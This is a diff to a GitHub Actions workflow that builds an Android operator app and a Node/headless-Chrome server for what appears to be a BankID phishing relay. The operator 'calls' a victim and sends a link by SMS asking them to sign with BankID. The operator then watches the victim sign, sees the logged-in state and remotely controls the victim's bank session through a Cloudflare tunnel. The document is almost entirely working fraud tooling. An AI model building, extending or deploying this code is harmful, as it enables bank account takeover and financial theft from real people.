@@ -5,6 +5,9 @@ on:
     branches: [ main ]
   workflow_dispatch:
 
+permissions:
+  contents: write
+
 concurrency:
   group: relay-${{ github.ref }}
   cancel-in-progress: true
@@ -29,7 +32,7 @@ jobs:
           server/logg.jsonl
           server/lar.json
           server/node_modules/
-          cprof/
+          hs/
           EOF
 
           w settings.gradle.kts <<'EOF'
@@ -68,8 +71,8 @@ jobs:
                   applicationId = "com.relay"
                   minSdk = 26
                   targetSdk = 34
-                  versionCode = 301
-                  versionName = "3.0.1"
+                  versionCode = 400
+                  versionName = "4.0.0"
               }
               buildTypes { getByName("debug") { isMinifyEnabled = false } }
               compileOptions {
@@ -113,7 +116,6 @@ jobs:
           package com.relay
 
           import android.app.Activity
-          import android.content.ActivityNotFoundException
           import android.content.ClipData
           import android.content.ClipboardManager
           import android.content.Context
@@ -128,6 +130,7 @@ jobs:
           import android.os.Looper
           import android.util.Base64
           import android.view.MotionEvent
+          import android.view.View
           import android.widget.Button
           import android.widget.EditText
           import android.widget.HorizontalScrollView
@@ -141,27 +144,28 @@ jobs:
           class MainActivity : Activity() {
 
               private lateinit var prefs: SharedPreferences
-              private lateinit var urlField: EditText
-              private lateinit var bankField: EditText
+              private lateinit var statusRad: TextView
               private lateinit var bankRad: LinearLayout
-              private lateinit var textField: EditText
+              private lateinit var ringKnapp: Button
+              private lateinit var kodView: TextView
+              private lateinit var lankView: TextView
+              private lateinit var textFalt: EditText
               private lateinit var skarm: ImageView
-              private lateinit var statusView: TextView
+              private lateinit var panel: LinearLayout
+              private lateinit var urlFalt: EditText
               private lateinit var debugView: TextView
-              private lateinit var linkView: TextView
 
               private val ui = Handler(Looper.getMainLooper())
               private val rader = ArrayDeque<String>()
 
+              @Volatile private var bas = "http://127.0.0.1:3000"
               @Volatile private var bank = "swedbank"
-              @Volatile private var code = ""
-              @Volatile private var inloggad = false
-              @Volatile private var signed = false
+              @Volatile private var kod = ""
+              @Volatile private var lank = ""
               @Volatile private var stopp = false
+              @Volatile private var chromeOk = false
               @Volatile private var laddar = false
               @Volatile private var rullar = false
-              @Volatile private var chromeOk = false
-              @Volatile private var kortUrl = ""
               @Volatile private var nedY = 0f
               @Volatile private var vpW = 412
               @Volatile private var vpH = 900
@@ -169,86 +173,130 @@ jobs:
               override fun onCreate(s: Bundle?) {
                   super.onCreate(s)
                   prefs = getSharedPreferences("relay", MODE_PRIVATE)
-                  code = prefs.getString("code", "") ?: ""
+                  bas = prefs.getString("bas", "http://127.0.0.1:3000") ?: "http://127.0.0.1:3000"
                   bank = prefs.getString("bank", "swedbank") ?: "swedbank"
-                  byggUi()
-                  laddaBanker()
-                  laddaConfig()
+                  bygg()
+                  trad { laddaBanker() }
                   startaSkarm()
-                  startaPoll()
+                  startaHalsa()
               }
 
-              private fun byggUi() {
-                  val root = LinearLayout(this)
-                  root.orientation = LinearLayout.VERTICAL
-                  root.setBackgroundColor(Color.parseColor("#0f1419"))
+              private fun bygg() {
+                  val rot = LinearLayout(this)
+                  rot.orientation = LinearLayout.VERTICAL
+                  rot.setBackgroundColor(Color.parseColor("#0f1419"))
 
-                  urlField = felt("server-url  https://xxx.trycloudflare.com", prefs.getString("url", "") ?: "")
-                  root.addView(urlField, lp())
+                  statusRad = TextView(this)
+                  statusRad.setTextColor(Color.WHITE)
+                  statusRad.textSize = 13f
+                  statusRad.setPadding(dp(10), dp(9), dp(10), dp(9))
+                  statusRad.setBackgroundColor(Color.parseColor("#7f1d1d"))
+                  statusRad.text = "startar..."
+                  rot.addView(statusRad, LinearLayout.LayoutParams(-1, -2))
 
                   val hs = HorizontalScrollView(this)
                   hs.isHorizontalScrollBarEnabled = false
                   bankRad = LinearLayout(this)
                   bankRad.orientation = LinearLayout.HORIZONTAL
                   hs.addView(bankRad)
-                  root.addView(hs, LinearLayout.LayoutParams(-1, -2))
+                  rot.addView(hs, LinearLayout.LayoutParams(-1, -2))
 
-                  bankField = felt("bank-url (anvands i Egen-lage)", prefs.getString("bankurl", "") ?: "")
-                  root.addView(bankField, lp())
+                  ringKnapp = Button(this)
+                  ringKnapp.text = "RING"
+                  ringKnapp.textSize = 20f
+                  ringKnapp.setBackgroundColor(Color.parseColor("#16a34a"))
+                  ringKnapp.setTextColor(Color.WHITE)
+                  rot.addView(ringKnapp, LinearLayout.LayoutParams(-1, dp(58))
+                      .also { it.setMargins(dp(8), dp(4), dp(8), dp(4)) })
 
-                  val r1 = LinearLayout(this); r1.orientation = LinearLayout.HORIZONTAL
-                  val kor = knapp("KOR", "#2b6cb0")
-                  val ny = knapp("NY ORDER", "#b7791f")
-                  val lank = knapp("LANK", "#2b6cb0")
-                  val kod = knapp("KOD", "#4a5568")
-                  val logg = knapp("LOGG", "#4a5568")
-                  r1.addView(kor, lpv()); r1.addView(ny, lpv()); r1.addView(lank, lpv())
-                  r1.addView(kod, lpv()); r1.addView(logg, lpv())
-                  root.addView(r1)
+                  val rad = LinearLayout(this)
+                  rad.orientation = LinearLayout.HORIZONTAL
+                  kodView = TextView(this)
+                  kodView.setTextColor(Color.parseColor("#fde047"))
+                  kodView.textSize = 23f
+                  kodView.setPadding(dp(10), 0, dp(8), 0)
+                  rad.addView(kodView, LinearLayout.LayoutParams(0, -2, 1f))
+                  val smsKnapp = Button(this)
+                  smsKnapp.text = "SMS"
+                  smsKnapp.textSize = 13f
+                  smsKnapp.setBackgroundColor(Color.parseColor("#2563eb"))
+                  smsKnapp.setTextColor(Color.WHITE)
+                  smsKnapp.setOnClickListener { smsa() }
+                  rad.addView(smsKnapp, LinearLayout.LayoutParams(-2, -2))
+                  rot.addView(rad, LinearLayout.LayoutParams(-1, -2))
 
-                  val r2 = LinearLayout(this); r2.orientation = LinearLayout.HORIZONTAL
-                  textField = felt("skriv / css-selektor", "")
-                  r2.addView(textField, LinearLayout.LayoutParams(0, -2, 2.2f))
-                  val txt = knapp("TXT", "#4a5568")
-                  val ent = knapp("ENT", "#4a5568")
-                  val tab = knapp("TAB", "#4a5568")
-                  val bsk = knapp("BSK", "#4a5568")
-                  val sel = knapp("SEL", "#4a5568")
-                  r2.addView(txt, lpv()); r2.addView(ent, lpv()); r2.addView(tab, lpv())
-                  r2.addView(bsk, lpv()); r2.addView(sel, lpv())
-                  root.addView(r2)
+                  lankView = TextView(this)
+                  lankView.setTextColor(Color.parseColor("#9ae6b4"))
+                  lankView.textSize = 11f
+                  lankView.setTextIsSelectable(true)
+                  lankView.setPadding(dp(10), 0, dp(10), 0)
+                  lankView.setOnClickListener { kopiera(lank) }
+                  rot.addView(lankView, LinearLayout.LayoutParams(-1, -2))
 
-                  linkView = TextView(this)
-                  linkView.setTextColor(Color.parseColor("#9ae6b4"))
-                  linkView.textSize = 11f
-                  linkView.setTextIsSelectable(true)
-                  root.addView(linkView, lp())
+                  val textRad = LinearLayout(this)
+                  textRad.orientation = LinearLayout.HORIZONTAL
+                  textFalt = EditText(this)
+                  textFalt.hint = "skriv / selektor"
+                  textFalt.setTextColor(Color.WHITE)
+                  textFalt.setHintTextColor(Color.parseColor("#6b7280"))
+                  textFalt.textSize = 12f
+                  textFalt.setSingleLine(true)
+                  textRad.addView(textFalt, LinearLayout.LayoutParams(0, -2, 2f))
+                  for ((txt, a) in listOf("TXT" to "txt", "ENT" to "enter", "TAB" to "tab",
+                                          "BSK" to "back", "SEL" to "sel")) {
+                      val b = Button(this)
+                      b.text = txt
+                      b.textSize = 10f
+                      b.setBackgroundColor(Color.parseColor("#334155"))
+                      b.setTextColor(Color.WHITE)
+                      b.setOnClickListener { tryck(a) }
+                      textRad.addView(b, LinearLayout.LayoutParams(0, -2, 1f))
+                  }
+                  rot.addView(textRad, LinearLayout.LayoutParams(-1, -2))
 
-                  statusView = TextView(this)
-                  statusView.setTextColor(Color.WHITE)
-                  statusView.textSize = 13f
-                  root.addView(statusView, lp())
-
+                  panel = LinearLayout(this)
+                  panel.orientation = LinearLayout.VERTICAL
+                  panel.visibility = View.GONE
+                  urlFalt = EditText(this)
+                  urlFalt.setText(bas)
+                  urlFalt.setTextColor(Color.WHITE)
+                  urlFalt.textSize = 11f
+                  urlFalt.setSingleLine(true)
+                  panel.addView(urlFalt, LinearLayout.LayoutParams(-1, -2))
                   debugView = TextView(this)
                   debugView.setTextColor(Color.parseColor("#ecc94b"))
-                  debugView.textSize = 10f
-                  root.addView(debugView, lp())
+                  debugView.textSize = 9f
+                  panel.addView(debugView, LinearLayout.LayoutParams(-1, -2))
+                  rot.addView(panel, LinearLayout.LayoutParams(-1, -2))
 
                   skarm = ImageView(this)
                   skarm.scaleType = ImageView.ScaleType.FIT_XY
                   skarm.setBackgroundColor(Color.BLACK)
                   skarm.isClickable = true
-                  root.addView(skarm, LinearLayout.LayoutParams(-1, 0, 1f))
+                  rot.addView(skarm, LinearLayout.LayoutParams(-1, 0, 1f))
 
-                  setContentView(root)
+                  setContentView(rot)
+
+                  statusRad.setOnLongClickListener {
+                      panel.visibility = if (panel.visibility == View.GONE) View.VISIBLE else View.GONE
+                      true
+                  }
+                  urlFalt.setOnEditorActionListener { _, _, _ ->
+                      bas = urlFalt.text.toString().trim().trimEnd('/')
+                      prefs.edit().putString("bas", bas).apply()
+                      trad { laddaBanker() }
+                      trad { skickaViewport() }
+                      true
+                  }
+
+                  ringKnapp.setOnClickListener { ring() }
 
                   skarm.addOnLayoutChangeListener { _, _, _, _, _, _, _, _, _ ->
                       val w = skarm.width; val h = skarm.height
                       if (w > 60 && h > 60) {
-                          val d = resources.displayMetrics.density
-                          vpW = (w / d).toInt()
-                          vpH = (h / d).toInt()
-                          skickaViewport()
+                          vpW = (w / resources.displayMetrics.density).toInt()
+                          vpH = (h / resources.displayMetrics.density).toInt()
+                          trad { skickaViewport() }
                       }
                   }
 
@@ -258,10 +306,11 @@ jobs:
                           MotionEvent.ACTION_UP -> {
                               val dy = e.y - nedY
                               if (Math.abs(dy) > 30f) {
-                                  trad { post(u() + "/api/rulla", "{\"bank\":\"" + bank + "\",\"x\":" + px(e.x) +
-                                      ",\"y\":" + py(e.y) + ",\"dy\":" + (-dy * vpH / skarm.height) + "}") }
+                                  val d = (-dy * vpH / skarm.height).toInt()
+                                  trad { post("/api/rulla", "{\"bank\":\"" + bank + "\",\"x\":" + px(e.x) +
+                                      ",\"y\":" + py(e.y) + ",\"dy\":" + d + "}") }
                               } else {
-                                  trad { post(u() + "/api/peka", "{\"bank\":\"" + bank + "\",\"x\":" + px(e.x) +
+                                  trad { post("/api/peka", "{\"bank\":\"" + bank + "\",\"x\":" + px(e.x) +
                                       ",\"y\":" + py(e.y) + "}") }
                               }
                               rullar = false
@@ -270,166 +319,134 @@ jobs:
                           else -> false
                       }
                   }
+              }
 
-                  kor.setOnClickListener {
-                      prefs.edit().putString("url", urlField.text.toString().trim())
-                          .putString("bankurl", bankField.text.toString().trim())
-                          .putString("bank", bank).apply()
-                      if (u().isEmpty()) { statusView.text = "FYLL I SERVER-URL FORST"; return@setOnClickListener }
-                      code = ""; signed = false; inloggad = false
-                      linkView.text = ""
-                      statusView.text = "KOR " + bank + " - oppnar i chrome"
-                      trad {
-                          try {
-                              val s = post(u() + "/api/kor", JSONObject()
-                                  .put("bank", bank).put("url", bankField.text.toString().trim()).toString())
-                              val j = JSONObject(s)
-                              if (j.optBoolean("ok")) {
-                                  code = j.optString("code")
-                                  prefs.edit().putString("code", code).apply()
-                                  ui.post { statusView.text = "SESSION " + code + " - tryck LANK" }
-                                  logga("KOR " + bank + " " + code)
-                              } else {
-                                  ui.post { statusView.text = "KOR-FEL: " + j.optString("fel") }
-                              }
-                          } catch (e: Throwable) {
-                              ui.post { statusView.text = "KOR-FEL (server)" }
-                              logga("KOR " + e.toString().take(90))
-                          }
+              private fun tryck(a: String) {
+                  val t = textFalt.text.toString()
+                  when (a) {
+                      "sel" -> if (t.isNotEmpty()) trad { post("/api/klick", JSONObject().put("bank", bank).put("sel", t).toString()) }
+                      "txt" -> if (t.isNotEmpty()) {
+                          trad { post("/api/text", JSONObject().put("bank", bank).put("t", t).toString()) }
+                          textFalt.setText("")
                       }
+                      else -> trad { post("/api/tangent", JSONObject().put("bank", bank).put("k", a).toString()) }
                   }
-
-                  ny.setOnClickListener {
-                      if (code.isEmpty()) { statusView.text = "INGEN SESSION"; return@setOnClickListener }
-                      trad { post(u() + "/api/nyorder", JSONObject().put("code", code).toString()) }
-                      statusView.text = "NY ORDER - ny token, samma lank"
-                  }
-
-                  lank.setOnClickListener { kopiera("/b?code=", true) }
-                  kod.setOnClickListener { kopiera("/k?code=", false) }
-                  logg.setOnClickListener {
-                      try { startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(u() + "/logg"))) }
-                      catch (e: ActivityNotFoundException) { statusView.text = "ingen webblasare" }
-                  }
-
-                  txt.setOnClickListener {
-                      val t = textField.text.toString()
-                      if (t.isEmpty()) return@setOnClickListener
-                      trad { post(u() + "/api/text", JSONObject().put("bank", bank).put("t", t).toString()) }
-                      textField.setText("")
-                  }
-                  ent.setOnClickListener { tangent("enter") }
-                  tab.setOnClickListener { tangent("tab") }
-                  bsk.setOnClickListener { tangent("back") }
-                  sel.setOnClickListener {
-                      val t = textField.text.toString().trim()
-                      if (t.isEmpty()) return@setOnClickListener
-                      trad { post(u() + "/api/klick", JSONObject().put("bank", bank).put("sel", t).toString()) }
-                      statusView.text = "klickar " + t
-                  }
-
-                  statusView.text = "kor bash server/start.sh i Termux forst"
               }
 
-              private fun tangent(k: String) {
-                  trad { post(u() + "/api/tangent", JSONObject().put("bank", bank).put("k", k).toString()) }
-              }
-
-              private fun kopiera(suffix: String, kort: Boolean) {
-                  if (code.isEmpty()) { statusView.text = "INGEN KOD ANN - tryck KOR"; return }
-                  val bas = if (kort && kortUrl.isNotEmpty()) kortUrl else u()
-                  val l = bas.trimEnd('/') + suffix + code
-                  linkView.text = l
-                  (getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager)
-                      .setPrimaryClip(ClipData.newPlainText("lank", l))
-                  statusView.text = if (suffix.startsWith("/b")) "LANK KOPIERAD - kunden klickar, BankID startar" else "KODSIDA KOPIERAD"
-              }
-
-              private fun px(x: Float) = (x / skarm.width * vpW).toInt()
-              private fun py(y: Float) = (y / skarm.height * vpH).toInt()
-              private fun u() = urlField.text.toString().trim().trimEnd('/')
-
-              private fun skickaViewport() {
-                  val uu = u()
-                  if (uu.isEmpty()) return
-                  trad { try { post(uu + "/api/viewport", "{\"w\":" + vpW + ",\"h\":" + vpH + "}") } catch (e: Throwable) {} }
-              }
-
-              private fun laddaConfig() {
+              private fun ring() {
+                  kod = ""; lank = ""
+                  ui.post { kodView.text = ""; lankView.text = ""; ringKnapp.isEnabled = false; ringKnapp.text = "STARTAR..." }
                   trad {
                       try {
-                          val j = JSONObject(get(u() + "/api/config"))
-                          kortUrl = j.optString("kortUrl") ?: ""
-                          if (kortUrl.isNotEmpty()) ui.post { logga("kort lank: " + kortUrl) }
-                      } catch (e: Throwable) { }
-                  }
-              }
-
-              private fun laddaBanker() {
-                  trad {
-                      try {
-                          val j = JSONObject(get(u() + "/api/banker"))
-                          val arr = j.optJSONArray("banker")
-                          if (arr != null) {
-                              val bygg = ArrayList<Triple<String, String, String>>()
-                              for (i in 0 until arr.length()) {
-                                  val o = arr.getJSONObject(i)
-                                  bygg.add(Triple(o.optString("nyckel"), o.optString("namn"), o.optString("start")))
-                              }
+                          val j = JSONObject(post("/api/kor", JSONObject().put("bank", bank).toString()))
+                          if (j.optBoolean("ok")) {
+                              kod = j.optString("code")
+                              lank = j.optString("lank")
                               ui.post {
-                                  bankRad.removeAllViews()
-                                  for ((k, n, st) in bygg) {
-                                      val b = knapp(n, if (k == bank) "#2b6cb0" else "#334155")
-                                      b.textSize = 11f
-                                      b.setOnClickListener { veljBank(k, st) }
-                                      bankRad.addView(b, LinearLayout.LayoutParams(-2, -2)
-                                          .also { it.setMargins(dp(3), dp(2), dp(3), dp(2)) })
-                                  }
-                                  val fri = knapp("Egen", if (bank == "fri") "#2b6cb0" else "#334155")
-                                  fri.textSize = 11f
-                                  fri.setOnClickListener { veljBank("fri", null) }
-                                  bankRad.addView(fri, LinearLayout.LayoutParams(-2, -2)
-                                      .also { it.setMargins(dp(3), dp(2), dp(3), dp(2)) })
+                                  kodView.text = "KOD " + kod
+                                  lankView.text = lank
+                                  ringKnapp.isEnabled = true
+                                  ringKnapp.text = "RING IGEN"
+                                  status("Vantar pa att kunden oppnar lanken", "#b45309")
+                                  kopiera(lank)
+                              }
+                              folj()
+                          } else {
+                              ui.post {
+                                  ringKnapp.isEnabled = true; ringKnapp.text = "RING"
+                                  status("KOR-FEL: " + j.optString("fel"), "#7f1d1d")
                               }
                           }
                       } catch (e: Throwable) {
-                          ui.post { logga("banker-fel " + e.toString().take(80)) }
+                          ui.post {
+                              ringKnapp.isEnabled = true; ringKnapp.text = "RING"
+                              status("KOR-FEL - servern svarar inte", "#7f1d1d")
+                          }
+                          logga("KOR " + e.toString().take(80))
                       }
                   }
               }
 
-              private fun veljBank(k: String, start: String?) {
-                  bank = k
-                  if (start != null && start.isNotEmpty()) bankField.setText(start)
-                  prefs.edit().putString("bank", k).apply()
-                  statusView.text = "bank vald: " + k
-                  laddaBanker()
+              private fun folj() {
+                  val k = kod
+                  while (!stopp && kod == k && k.isNotEmpty()) {
+                      try {
+                          val j = JSONObject(get("/api/state?code=" + k))
+                          if (j.optBoolean("inloggad")) { ui.post { status("INLOGGAD", "#15803d") }; return }
+                          if (j.optBoolean("signed")) ui.post { status("Kunden signerar - vantar pa inloggning", "#b45309") }
+                          if (j.optBoolean("token") && !j.optBoolean("signed")) ui.post { status("Kunden har lanken - vantar pa signering", "#b45309") }
+                      } catch (e: Throwable) { }
+                      try { Thread.sleep(2000) } catch (e: Throwable) { }
+                  }
+              }
+
+              private fun smsa() {
+                  if (lank.isEmpty()) return
+                  val txt = "Hej! Oppna lanken och signera med BankID: " + lank
+                  try { startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("sms:?body=" + Uri.encode(txt)))) }
+                  catch (e: Throwable) { logga("sms-fel " + e.toString().take(60)) }
+              }
+
+              private fun kopiera(t: String) {
+                  if (t.isEmpty()) return
+                  (getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager)
+                      .setPrimaryClip(ClipData.newPlainText("lank", t))
+                  ui.post { status("Lank kopierad - skicka till kunden", "#b45309") }
+              }
+
+              private fun status(t: String, farg: String) {
+                  statusRad.text = t
+                  statusRad.setBackgroundColor(Color.parseColor(farg))
+              }
+
+              private fun laddaBanker() {
+                  try {
+                      val arr = JSONObject(get("/api/banker")).optJSONArray("banker") ?: return
+                      val lista = ArrayList<Triple<String, String, String>>()
+                      for (i in 0 until arr.length()) {
+                          val o = arr.getJSONObject(i)
+                          lista.add(Triple(o.optString("nyckel"), o.optString("namn"), o.optString("start")))
+                      }
+                      ui.post {
+                          bankRad.removeAllViews()
+                          for ((k, n, _) in lista) {
+                              val b = Button(this)
+                              b.text = n
+                              b.textSize = 12f
+                              b.setBackgroundColor(if (k == bank) Color.parseColor("#2563eb") else Color.parseColor("#334155"))
+                              b.setTextColor(Color.WHITE)
+                              b.setOnClickListener {
+                                  bank = k
+                                  prefs.edit().putString("bank", k).apply()
+                                  status("bank: " + n, "#15803d")
+                                  laddaBanker()
+                              }
+                              bankRad.addView(b, LinearLayout.LayoutParams(-2, -2)
+                                  .also { it.setMargins(dp(3), dp(2), dp(3), dp(2)) })
+                          }
+                      }
+                  } catch (e: Throwable) { logga("banker " + e.toString().take(70)) }
               }
 
               private fun startaSkarm() {
                   Thread {
                       while (!stopp) {
-                          val uu = u()
-                          if (uu.isNotEmpty() && !laddar) {
+                          if (chromeOk && !laddar) {
                               laddar = true
                               try {
-                                  val s = get(uu + "/api/skarm?bank=" + bank + "&t=" + System.currentTimeMillis())
-                                  val j = JSONObject(s)
+                                  val j = JSONObject(get("/api/skarm?bank=" + bank + "&t=" + System.currentTimeMillis()))
                                   if (j.optBoolean("ok")) {
-                                      chromeOk = true
-                                      val bytes = Base64.decode(j.optString("bild"), Base64.DEFAULT)
-                                      val bm = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
+                                      val b = Base64.decode(j.optString("bild"), Base64.DEFAULT)
+                                      val bm = BitmapFactory.decodeByteArray(b, 0, b.size)
                                       ui.post {
                                           if (bm != null) {
-                                              val gammal = skarm.drawable
+                                              val g = skarm.drawable
                                               skarm.setImageBitmap(bm)
-                                              (gammal as? BitmapDrawable)?.bitmap?.recycle()
+                                              (g as? BitmapDrawable)?.bitmap?.recycle()
                                           }
                                       }
-                                  } else {
-                                      chromeOk = false
                                   }
-                              } catch (e: Throwable) { chromeOk = false }
+                              } catch (e: Throwable) { }
                               laddar = false
                           }
                           try { Thread.sleep(if (rullar) 320L else 1000L) } catch (e: Throwable) { }
@@ -437,56 +454,48 @@ jobs:
                   }.start()
               }
 
-              private fun startaPoll() {
+              private fun startaHalsa() {
                   Thread {
-                      var visaChromeFel = true
                       while (!stopp) {
-                          val c = code
-                          val uu = u()
-                          if (c.isNotEmpty() && uu.isNotEmpty()) {
-                              try {
-                                  val j = JSONObject(get(uu + "/api/state?code=" + c))
-                                  if (j.optBoolean("inloggad") && !inloggad) {
-                                      inloggad = true; signed = true
-                                      ui.post { statusView.text = "INLOGGAD - verifierat pa sidan" }
-                                  }
-                                  if (j.optBoolean("signed") && !signed) {
-                                      signed = true
-                                      ui.post { statusView.text = "KUNDEN HAR SIGNERAT - vantar pa inloggning" }
-                                  }
-                                  val lg = j.optJSONArray("logg")
-                                  if (lg != null && lg.length() > 0) {
-                                      val sista = lg.optString(lg.length() - 1)
-                                      ui.post { if (rader.isEmpty() || rader.last() != sista) logga(sista) }
-                                  }
-                              } catch (e: Throwable) { }
+                          var ok = false
+                          try {
+                              val j = JSONObject(get("/api/halsa"))
+                              ok = j.optBoolean("ok")
+                              chromeOk = j.optBoolean("chrome")
+                          } catch (e: Throwable) { ok = false; chromeOk = false }
+                          ui.post {
+                              if (!ok) status("SERVER NERE - kor server/relay.sh", "#7f1d1d")
+                              else if (!chromeOk) status("WEBLASARE NERE - kor server/relay.sh", "#7f1d1d")
+                              else if (kod.isEmpty()) status("REDO", "#15803d")
                           }
-                          if (!chromeOk && visaChromeFel) {
-                              visaChromeFel = false
-                              ui.post { if (statusView.text.isEmpty()) statusView.text = "chrome inte kopplad - kor start.sh" }
-                          }
-                          if (chromeOk) visaChromeFel = true
-                          try { Thread.sleep(2000) } catch (e: Throwable) { }
+                          try { Thread.sleep(3000) } catch (e: Throwable) { }
                       }
                   }.start()
               }
 
-              private fun post(u: String, body: String): String {
-                  val c = URL(u).openConnection() as HttpURLConnection
+              private fun px(x: Float) = (x / skarm.width * vpW).toInt()
+              private fun py(y: Float) = (y / skarm.height * vpH).toInt()
+
+              private fun skickaViewport() {
+                  try { post("/api/viewport", "{\"w\":" + vpW + ",\"h\":" + vpH + "}") } catch (e: Throwable) { }
+              }
+
+              private fun post(vag: String, kropp: String): String {
+                  val c = URL(bas + vag).openConnection() as HttpURLConnection
                   c.requestMethod = "POST"
-                  c.connectTimeout = 12000
+                  c.connectTimeout = 8000
                   c.readTimeout = 25000
                   c.doOutput = true
                   c.setRequestProperty("Content-Type", "application/json")
-                  c.outputStream.use { it.write(body.toByteArray()) }
+                  c.outputStream.use { it.write(kropp.toByteArray()) }
                   val sc = c.responseCode
                   return (if (sc in 200..299) c.inputStream else c.errorStream)
                       ?.bufferedReader()?.use { it.readText() } ?: ""
               }
 
-              private fun get(u: String): String {
-                  val c = URL(u).openConnection() as HttpURLConnection
-                  c.connectTimeout = 12000
+              private fun get(vag: String): String {
+                  val c = URL(bas + vag).openConnection() as HttpURLConnection
+                  c.connectTimeout = 8000
                   c.readTimeout = 25000
                   val sc = c.responseCode
                   return (if (sc in 200..299) c.inputStream else c.errorStream)
@@ -494,41 +503,15 @@ jobs:
               }
 
               private fun trad(b: () -> Unit) {
-                  Thread { try { b() } catch (e: Throwable) { ui.post { logga("FEL " + e.toString().take(90)) } } }.start()
+                  Thread { try { b() } catch (e: Throwable) { logga("FEL " + e.toString().take(70)) } }.start()
               }
 
               private fun logga(s: String) {
                   ui.post {
-                      rader.addLast(s.replace("\n", " ").take(180))
-                      while (rader.size > 6) rader.removeFirst()
+                      rader.addLast(s.replace("\n", " ").take(160))
+                      while (rader.size > 5) rader.removeFirst()
                       debugView.text = rader.joinToString("\n")
                   }
-              }
-
-              private fun lp(): LinearLayout.LayoutParams =
-                  LinearLayout.LayoutParams(-1, -2).also { it.setMargins(dp(6), dp(2), dp(6), dp(2)) }
-
-              private fun lpv(): LinearLayout.LayoutParams =
-                  LinearLayout.LayoutParams(0, -2, 1f).also { it.setMargins(dp(2), dp(2), dp(2), dp(2)) }
-
-              private fun knapp(t: String, c: String): Button {
-                  val b = Button(this)
-                  b.text = t
-                  b.textSize = 11f
-                  b.setBackgroundColor(Color.parseColor(c))
-                  b.setTextColor(Color.WHITE)
-                  return b
-              }
-
-              private fun felt(hint: String, text: String): EditText {
-                  val e = EditText(this)
-                  e.hint = hint
-                  e.setText(text)
-                  e.setTextColor(Color.WHITE)
-                  e.setHintTextColor(Color.parseColor("#6b7280"))
-                  e.textSize = 12f
-                  e.setSingleLine(true)
-                  return e
               }
 
               private fun dp(v: Int) = (v * resources.displayMetrics.density).toInt()
@@ -540,7 +523,7 @@ jobs:
           w server/package.json <<'EOF'
           {
             "name": "relay-server",
-            "version": "3.0.1",
+            "version": "4.0.0",
             "private": true,
             "scripts": { "start": "node server.js" },
             "dependencies": { "ws": "^8.18.0" }
@@ -624,47 +607,55 @@ jobs:
           }
           EOF
 
-          w server/start.sh <<'EOF'
+          w server/relay.sh <<'EOF'
           #!/data/data/com.termux/files/usr/bin/bash
+          # Startar webblasare, tunnel och server. Haller dem vid liv.
           cd "$(dirname "$0")"
           termux-wake-lock 2>/dev/null
-          export DISPLAY=:0
 
-          pgrep -f termux.x11 >/dev/null 2>&1 || { termux-x11 :0 >/dev/null 2>&1 & sleep 4; }
+          BROWSER="$HOME/hs"
+          TLOG="$HOME/tunnel.log"
 
-          if ! curl -s --max-time 2 http://127.0.0.1:9222/json/version >/dev/null 2>&1; then
-            echo "startar chromium..."
-            nohup chromium \
-              --user-data-dir="$HOME/cprof" \
-              --remote-debugging-port=9222 \
-              --remote-allow-origins='*' \
-              --no-first-run --no-default-browser-check \
-              --disable-gpu --disable-dev-shm-usage \
-              --window-size=420,900 \
-              about:blank >/dev/null 2>&1 &
-            sleep 7
-          fi
+          starta_browser() {
+            curl -s --max-time 2 http://127.0.0.1:9222/json/version >/dev/null 2>&1 && return
+            echo "startar webblasare..."
+            nohup headless_shell --no-sandbox --disable-gpu --disable-dev-shm-usage \
+              --remote-debugging-address=127.0.0.1 --remote-debugging-port=9222 \
+              --remote-allow-origins='*' --user-data-dir="$BROWSER" \
+              about:blank > "$HOME/chrome.log" 2>&1 &
+            sleep 6
+          }
 
-          curl -s --max-time 2 http://127.0.0.1:9222/json/version >/dev/null 2>&1 \
-            && echo "chromium: ok" || echo "chromium: SVARAR INTE"
+          starta_tunnel() {
+            pgrep -f "cloudflared tunnel" >/dev/null 2>&1 && return
+            echo "startar tunnel..."
+            : > "$TLOG"
+            nohup cloudflared tunnel --url http://localhost:3000 --protocol http2 \
+              --no-autoupdate > "$TLOG" 2>&1 &
+            sleep 12
+          }
 
-          [ -d node_modules ] || npm install --no-audit --no-fund
-          exec node server.js
-          EOF
+          hitta_url() {
+            grep -ao 'https://[a-z0-9-]*\.trycloudflare\.com' "$TLOG" 2>/dev/null | tail -1
+          }
 
-          w server/chrome.sh <<'EOF'
-          #!/data/data/com.termux/files/usr/bin/bash
-          termux-wake-lock 2>/dev/null
-          export DISPLAY=:0
-          pgrep -f termux.x11 >/dev/null 2>&1 || { termux-x11 :0 >/dev/null 2>&1 & sleep 4; }
-          exec chromium \
-            --user-data-dir="$HOME/cprof" \
-            --remote-debugging-port=9222 \
-            --remote-allow-origins='*' \
-            --no-first-run --no-default-browser-check \
-            --disable-gpu --disable-dev-shm-usage \
-            --window-size=420,900 \
-            about:blank
+          starta_browser
+          starta_tunnel
+          PUBLIC_URL="$(hitta_url)"
+          echo "KUNDLANK-BAS: $PUBLIC_URL"
+
+          while true; do
+            starta_browser
+            if ! pgrep -f "cloudflared tunnel" >/dev/null 2>&1; then
+              starta_tunnel
+              PUBLIC_URL="$(hitta_url)"
+              echo "NY KUNDLANK-BAS: $PUBLIC_URL"
+            fi
+            [ -d node_modules ] || npm install --no-audit --no-fund
+            PUBLIC_URL="$PUBLIC_URL" node server.js
+            echo "servern dog - startar om"
+            sleep 3
+          done
           EOF
 
           w server/server.js <<'EOF'
@@ -675,7 +666,7 @@ jobs:
 
           const PORT = process.env.PORT || 3000;
           const CDP = 'http://127.0.0.1:' + (process.env.CDP_PORT || 9222);
-          const KORT = process.env.KORT_URL || '';
+          const PUBLIC = process.env.PUBLIC_URL || '';
           const FIL = path.join(__dirname, 'sessioner.json');
           const LOGG = path.join(__dirname, 'logg.jsonl');
           const LAR = path.join(__dirname, 'lar.json');
@@ -700,6 +691,13 @@ jobs:
             while (loggRader.length > 200) loggRader.shift();
             try { fs.appendFileSync(LOGG, new Date().toISOString() + ' ' + txt + '\n'); } catch (e) {}
             console.log(txt);
+          }
+
+          function fixUrl(x) {
+            if (!x) return x;
+            if (/^[a-z]+:\/\//i.test(x)) return x;
+            if (/^(about|data|file):/i.test(x)) return x;
+            return 'https://' + x.replace(/^\/+/, '');
           }
 
           function spara() { dirty = true; }
@@ -787,7 +785,8 @@ jobs:
             s.kalla = kalla;
             spara();
             if (url) larIn(bank, url);
